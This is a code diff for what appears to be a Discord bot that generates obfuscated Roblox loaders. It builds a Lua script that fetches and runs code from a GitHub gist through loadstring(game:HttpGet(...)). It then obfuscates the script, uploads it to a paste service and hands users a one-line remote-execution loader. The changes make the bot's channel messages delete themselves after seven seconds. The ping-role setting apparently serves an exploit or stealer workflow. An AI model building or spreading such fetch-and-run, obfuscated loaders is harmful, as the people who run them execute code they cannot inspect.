@@ -57,7 +57,6 @@ _G.PING_ROLE_ID = '${pingRole}'
 loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/a7348c340afc847b43c20e09bf78d445/raw/cd242a9edf1d021d926dd1ab65780a67104d6b5b/ANTIWARES', true))()
 `;
 
-  // Defer the reply
   await submitted.deferReply();
 
   let obfuscated;
@@ -72,9 +71,7 @@ loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/a7348
 
   const pasteResponse = await fetch(apiUrl, {
     method: 'POST',
-    headers: {
-      'Content-Type': 'text/plain',
-    },
+    headers: { 'Content-Type': 'text/plain' },
     body: obfuscated,
   });
 
@@ -89,12 +86,23 @@ loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/a7348
 
   const loadstring = `loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/${id}/raw"))()`;
 
-  // Send to DMs
+  // --- SEND TO DMS ---
+  const dmMessage = `✅ **Loader generated!**\n\n**PC (code block):**\n\`\`\`lua\n${loadstring}\n\`\`\`\n**Mobile (plain text, tap to copy):**\n${loadstring}`;
+
   try {
-    await interaction.user.send(`✅ **Loader generated!**\n\`\`\`lua\n${loadstring}\n\`\`\``);
-    await submitted.editReply('✅ Loader generated and sent to your DMs!');
+    await interaction.user.send(dmMessage);
   } catch (err) {
-    // If DMs are closed, send in channel
-    await submitted.editReply(`✅ **Loader generated!**\n\`\`\`lua\n${loadstring}\n\`\`\``);
+    // If DMs are closed, send in channel with delete
+    const channelMsg = await submitted.editReply(`✅ **Loader generated!**\n\n**PC:**\n\`\`\`lua\n${loadstring}\n\`\`\`\n**Mobile:**\n${loadstring}`);
+    setTimeout(() => {
+      channelMsg.delete().catch(() => {});
+    }, 7000);
+    return;
   }
+
+  // Send confirmation in channel, delete after 7 seconds
+  const confirmMsg = await submitted.editReply('✅ Loader generated and sent to your DMs!');
+  setTimeout(() => {
+    confirmMsg.delete().catch(() => {});
+  }, 7000);
 }
